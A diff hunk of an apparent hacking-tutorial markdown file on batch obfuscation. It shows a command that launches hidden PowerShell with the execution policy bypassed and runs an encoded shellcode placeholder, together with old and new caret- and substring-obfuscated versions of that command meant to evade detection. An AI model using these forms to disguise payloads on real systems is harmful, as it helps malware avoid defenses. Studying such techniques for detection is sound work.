@@ -741,7 +741,7 @@ Here we can view the all process of encoding/decoding in powershell console
 <br />
 
       DE-OBFUSCATED : cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $ENCODED-SHELLCODE-STRING
-      OBFUSCATED    : @c^Md%i:~63,1%e^x%i:~3,1% %i:~62,1%c pO^w%U7%h%i:~3,1%L^l%i:~63,1%e^xE %H1%%E0%p -%i:~25,1%%i:~44,1%n^D %i:~7,1%id^D%k8% %H1%ex^EC %i:~1,1%%i:~24,1%P^a%i:~53,1%s %H1%n^o%w2% -%k8%c $ENCODED-SHELLCODE-STRING
+      OBFUSCATED    : @c^M%k8%.E"x"%!h% /%i0:~1,1% =P%i0:~12,1%^W%!h%rS%i0:~6,1%%!h%l^L"."%!h%Xe '-'%U7%op "-"wI%U7%%k8% H%i0:~7,1%%k8%D%!h%N '-'%!h%^X'e'%C By%i0:~13,1%A^s%i0:~16,1% "-"%U7%O^n%i0:~7,1% "-"%!h%NC $ENCODED-SHELLCODE-STRING
 
 [!] [The above OBFUSCATED syscall (string) its embbebed into this demo template.bat](https://pastebin.com/vnNELqd4)<br />
 [0] [Glosario](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#glosario)<br />
